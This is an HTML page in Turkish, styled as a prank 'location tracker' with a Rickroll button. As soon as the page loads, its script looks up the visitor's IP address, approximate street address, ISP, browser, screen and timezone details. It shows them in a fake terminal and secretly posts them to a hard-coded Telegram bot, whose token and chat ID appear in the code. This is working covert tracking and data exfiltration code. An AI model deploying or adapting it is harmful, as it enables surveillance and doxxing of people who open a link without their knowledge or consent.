<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Konum Takipçisi</title>
  <style>
    html, body {
      margin: 0; 
      padding: 0; 
      width: 100%; 
      height: 100vh;
      background: black;
      color: #00ff00;
      font-family: monospace;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    #container {
      width: 95vw;
      max-width: 1200px;
      height: 95vh;
      background-color: black;
      border-radius: 8px;
      box-sizing: border-box;
      box-shadow: 0 0 20px #00ff00;
      display: flex;
      flex-direction: column;
      gap: 8px;
      position: relative;
    }
    
    #terminal {
      flex: 1 1 40%;
      background: black;
      padding: 15px;
      overflow-y: auto;
      font-size: 14px;
      line-height: 1.4;
      white-space: pre-wrap;
      user-select: none;
      border-radius: 8px;
      border: 1px solid #00ff00;
    }
    
    #map {
      flex: 1 1 60%;
      border: 2px solid #00ff00;
      border-radius: 8px;
      background: #111;
    }
    
    #rickrollButton {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: none;
      background: #00ff00;
      color: black;
      padding: 14px 35px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      user-select: none;
      font-size: 18px;
      transition: all 0.3s ease;
      box-shadow: 0 0 15px #00ff00;
      z-index: 1000;
    }
    
    #rickrollButton:hover {
      background: #00cc00;
      box-shadow: 0 0 25px #00ff00;
      transform: translateX(-50%) scale(1.05);
    }
    
    .leaflet-container {
      background: #111 !important;
      border-radius: 6px;
    }
    
    .leaflet-popup-content-wrapper {
      background: #222 !important;
      color: #00ff00 !important;
      border-radius: 6px;
    }
    
    .leaflet-popup-tip {
      background: #222 !important;
    }
    
    .leaflet-popup-content {
      margin: 12px 16px;
      line-height: 1.5;
    }
  </style>

  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css"
  />
</head>
<body>
  <div id="container">
    <pre id="terminal"></pre>
    <div id="map"></div>
    <button id="rickrollButton">🎁 Sürpriz İçin Tıkla</button>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const button = document.getElementById('rickrollButton');
    let map;

    function logToTerminal(text) {
      terminal.textContent += text + '\n';
      terminal.scrollTop = terminal.scrollHeight;
    }

    function getCurrentTime() {
      return new Date().toLocaleString('tr-TR');
    }

    function decToDMS(deg) {
      const absolute = Math.abs(deg);
      const degrees = Math.floor(absolute);
      const minutes = ((absolute - degrees) * 60).toFixed(1);
      return { degrees, minutes };
    }

    function formatCoordinate(lat, lon) {
      const latDMS = decToDMS(lat);
      const lonDMS = decToDMS(lon);
      const latCardinal = lat >= 0 ? "Kuzey" : "Güney";
      const lonCardinal = lon >= 0 ? "Doğu" : "Batı";

      return `${latDMS.degrees}°${latDMS.minutes}' ${latCardinal}, ${lonDMS.degrees}°${lonDMS.minutes}' ${lonCardinal}`;
    }

    async function getLocationData() {
      try {
        logToTerminal(`[${getCurrentTime()}] IP tabanlı konum alınıyor...`);
        
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        if (data.error) {
          throw new Error('IP tabanlı konum alınamadı');
        }

        return {
          latitude: data.latitude,
          longitude: data.longitude,
          city: data.city || 'Bilinmiyor',
          region: data.region || 'Bilinmiyor',
          country: data.country_name || 'Bilinmiyor',
          ip: data.ip || 'Bilinmiyor',
          org: data.org || 'Bilinmiyor',
          postal: data.postal || 'Bilinmiyor',
          street: '',
          neighborhood: ''
        };
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] IP konum hatası: ${error.message}`);
        
        return {
          latitude: 41.0082,
          longitude: 28.9784,
          city: 'İstanbul',
          region: 'İstanbul',
          country: 'Türkiye',
          ip: 'Tespit edilemedi',
          org: 'Bilinmiyor',
          postal: 'Bilinmiyor',
          street: '',
          neighborhood: ''
        };
      }
    }

    async function reverseGeocode(lat, lon) {
      try {
        logToTerminal(`[${getCurrentTime()}] Detaylı adres bilgisi alınıyor...`);
        
        // OpenStreetMap Nominatim API kullanıyoruz
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1&accept-language=tr`;
        const response = await fetch(url, {
          headers: { 
            'User-Agent': 'KonumTakipci/1.0',
            'Accept': 'application/json'
          }
        });
        
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`);
        }
        
        const data = await response.json();
        
        if (!data || !data.address) {
          throw new Error('Adres bilgisi alınamadı');
        }

        const addr = data.address;
        
        // Türkiye için daha uygun alan adları
        const street = addr.road || addr.pedestrian || addr.path || addr.footway || 
                      addr.cycleway || addr.street || '';
        
        const neighborhood = addr.suburb || addr.neighbourhood || addr.quarter || 
                           addr.residential || addr.city_district || addr.district || '';
        
        const city = addr.city || addr.town || addr.municipality || addr.village || 
                    addr.hamlet || '';
        
        const region = addr.state || addr.province || addr.region || '';
        const country = addr.country || '';
        
        // Posta kodu bilgisi
        const postal = addr.postcode || '';
        
        logToTerminal(`[${getCurrentTime()}] ✅ Adres bilgisi başarıyla alındı`);
        
        return {
          street: street,
          neighborhood: neighborhood,
          city: city,
          region: region,
          country: country,
          postal: postal,
          fullAddress: data.display_name || ''
        };
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] Reverse geocoding hatası: ${error.message}`);
        
        // Alternatif API denemesi
        try {
          logToTerminal(`[${getCurrentTime()}] Alternatif API deneniyor...`);
          
          const altUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=tr`;
          const altResponse = await fetch(altUrl);
          const altData = await altResponse.json();
          
          if (altData) {
            return {
              street: altData.locality || '',
              neighborhood: altData.principalSubdivision || '',
              city: altData.city || '',
              region: altData.principalSubdivision || '',
              country: altData.countryName || '',
              postal: altData.postcode || '',
              fullAddress: altData.locality || ''
            };
          }
        } catch (altError) {
          logToTerminal(`[${getCurrentTime()}] Alternatif API de başarısız: ${altError.message}`);
        }
        
        return { 
          street: 'Tespit edilemedi', 
          neighborhood: 'Tespit edilemedi', 
          city: '', 
          region: '', 
          country: '',
          postal: '',
          fullAddress: ''
        };
      }
    }

    async function sendTelegramMessage(message) {
      try {
        const chatId = '6400737507';
        const botToken = '8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
          })
        });
        
        logToTerminal(`[${getCurrentTime()}] 📱 Telegram mesajı gönderildi`);
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] Telegram API hatası: ${error.message}`);
      }
    }

    async function collectData() {
      logToTerminal(`[${getCurrentTime()}] 🚀 Sistem başlatılıyor...`);
      logToTerminal(`[${getCurrentTime()}] 📡 Veriler toplanıyor...`);

      let locationData = await getLocationData();
      
      // Reverse geocoding ile detaylı adres bilgisi al
      const reverseData = await reverseGeocode(locationData.latitude, locationData.longitude);
      
      // Mevcut verileri güncelle (boş olanları override et)
      locationData.street = reverseData.street || locationData.street || 'Tespit edilemedi';
      locationData.neighborhood = reverseData.neighborhood || locationData.neighborhood || 'Tespit edilemedi';
      locationData.city = reverseData.city || locationData.city;
      locationData.region = reverseData.region || locationData.region;
      locationData.country = reverseData.country || locationData.country;
      locationData.postal = reverseData.postal || locationData.postal;
      locationData.fullAddress = reverseData.fullAddress || '';

      const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);

      const infoMessage = 
        `🌍 KONUM BİLGİLERİ:\n` +
        `📍 IP: ${locationData.ip}\n` +
        `🏙️ Şehir: ${locationData.city}\n` +
        `🗺️ Bölge: ${locationData.region}\n` +
        `🏘️ Mahalle: ${locationData.neighborhood}\n` +
        `🛣️ Sokak: ${locationData.street}\n` +
        `📮 Posta Kodu: ${locationData.postal}\n` +
        `🌐 Ülke: ${locationData.country}\n` +
        `🏢 ISP: ${locationData.org}\n` +
        `📐 Koordinatlar: ${coordsFormatted}\n` +
        `📍 Tam Adres: ${locationData.fullAddress}\n\n` +

        `💻 TARAYICI BİLGİLERİ:\n` +
        `🔍 User Agent: ${navigator.userAgent}\n` +
        `🗣️ Dil: ${navigator.language}\n` +
        `⚙️ Platform: ${navigator.platform}\n` +
        `🍪 Çerez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
        `📶 Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +

        `🖥️ EKRAN BİLGİLERİ:\n` +
        `📺 Çözünürlük: ${screen.width}x${screen.height}\n` +
        `🎨 Renk Derinliği: ${screen.colorDepth}\n` +
        `🕐 Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
        `⏰ Şu anki Saat: ${getCurrentTime()}`;

      logToTerminal(infoMessage);

      await sendTelegramMessage(infoMessage);

      logToTerminal(`[${getCurrentTime()}] 🗺️ Harita yükleniyor...`);

      showMap(locationData.latitude, locationData.longitude, locationData);

      logToTerminal(`[${getCurrentTime()}] ✅ Sistem hazır!`);
      
      addButton();
    }

    function showMap(lat, lon, locationData) {
      try {
        document.getElementById('map').innerHTML = '';
        
        map = L.map('map').setView([lat, lon], 16);

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          maxZoom: 19,
          attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);

        const popupContent = `
          <div style="color: #00ff00; font-family: monospace;">
            <b>📍 Konumunuz</b><br><br>
            <b>🏙️ Şehir:</b> ${locationData.city}<br>
            <b>🗺️ Bölge:</b> ${locationData.region}<br>
            <b>🏘️ Mahalle:</b> ${locationData.neighborhood}<br>
            <b>🛣️ Sokak:</b> ${locationData.street}<br>
            <b>📮 Posta Kodu:</b> ${locationData.postal}<br>
            <b>🌐 Ülke:</b> ${locationData.country}<br>
            <b>📐 Koordinatlar:</b> ${formatCoordinate(lat, lon)}<br>
            ${locationData.fullAddress ? `<b>📍 Tam Adres:</b> ${locationData.fullAddress}` : ''}
          </div>`;

        L.marker([lat, lon])
          .addTo(map)
          .bindPopup(popupContent)
          .openPopup();
      } catch (e) {
        logToTerminal(`[${getCurrentTime()}] Harita yüklenirken hata: ${e.message}`);
      }
    }

    function addButton() {
      button.style.display = 'block';
      button.addEventListener('click', () => {
        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
      });
    }

    window.onload = collectData;
  </script>
</body>
</html>
